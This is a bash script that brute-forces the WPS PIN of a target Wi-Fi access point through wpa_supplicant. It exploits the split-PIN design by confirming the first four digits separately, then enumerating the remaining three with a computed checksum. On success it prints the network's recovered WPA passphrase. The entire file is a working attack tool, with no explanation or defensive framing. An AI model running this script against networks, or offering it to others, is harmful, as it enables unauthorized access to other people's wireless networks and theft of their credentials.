#!/bin/bash

RED='\x1b[31m'
GREEN='\x1b[32m'
GREY='\x1b[90m'
RESET='\x1b[0m'

bssid="$1"
[ -z "$IFACE" ] && IFACE=wlan0
[ -z "$TIMEOUT" ] && TIMEOUT=10

mkdir /tmp/wps_brute 2> /dev/null && chmod o+rw /tmp/wps_brute
shopt -s lastpipe

function connect(){
  echo -e 'ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1' | sudo tee /tmp/wps_brute/wpa_supplicant.conf > /dev/null
  { sleep 1; sudo /opt/wpa_supplicant/wpa_cli wps_reg "$1" "$2" > /dev/null; } &
  result='fail'
  sudo timeout $TIMEOUT /opt/wpa_supplicant/wpa_supplicant -i $IFACE -c /tmp/wps_brute/wpa_supplicant.conf | while read line
  do #echo "$line" >&2
    if echo "$line" | grep -q 'msg='; then
      if echo "$line" | grep -q 'msg=10'; then
        result='half'
      else
        result='wrong'
      fi
    elif echo "$line" | grep -q -e 'CTRL-EVENT-DISCONNECTED' -e 'CTRL-EVENT-TERMINATING'; then
      break
    fi
  done
  #cat /tmp/wps_brute/wpa_supplicant.conf >&2
  if cat /tmp/wps_brute/wpa_supplicant.conf | grep -q 'psk='; then
    echo 'success'
  else
    echo "$result"
  fi
}

function checksum(){
	typeset -i pin="10#$1"
	typeset -i accum=0
	while [ $pin -gt 0 ]; do
		accum+=$[3*($pin%10)]
		pin=$[$pin/10]
		accum+=$[$pin%10]
		pin=$[$pin/10]
	done
	echo $[(10-accum%10)%10]
}

for p1 in {0000..9999}
do
  p2='000'
  chs=$(checksum $p1$p2)
  pin=$p1$p2$chs
  echo -ne $GREY"$pin\r"$RESET
  result=$(connect "$bssid" "$pin")
  case $result in
    'half')
      echo -e $GREEN"$p1"$RESET"$p2$chs"
      break
      ;;
    'wrong')
      echo -e $RED"$p1"$RESET"$p2$chs"
      ;;
    'fail')
      echo ''
      ;;
  esac
done

for p2 in {000..999}
do
  chs=$(checksum $p1$p2)
  pin=$p1$p2$chs
  echo -ne $GREY"$pin\r"$RESET
  result=$(connect "$bssid" "$pin")
  case $result in
    'success')
      echo -e $GREEN"$pin"$RESET
      cat /tmp/wps_brute/wpa_supplicant.conf | grep 'psk=' | awk '{print $1}'
      break
      ;;
    'wrong'|'half')
      echo -e $GREEN"$p1"$RED"$p2"$RESET"$chs"
      ;;
    'fail')
      echo ''
      ;;
  esac
done
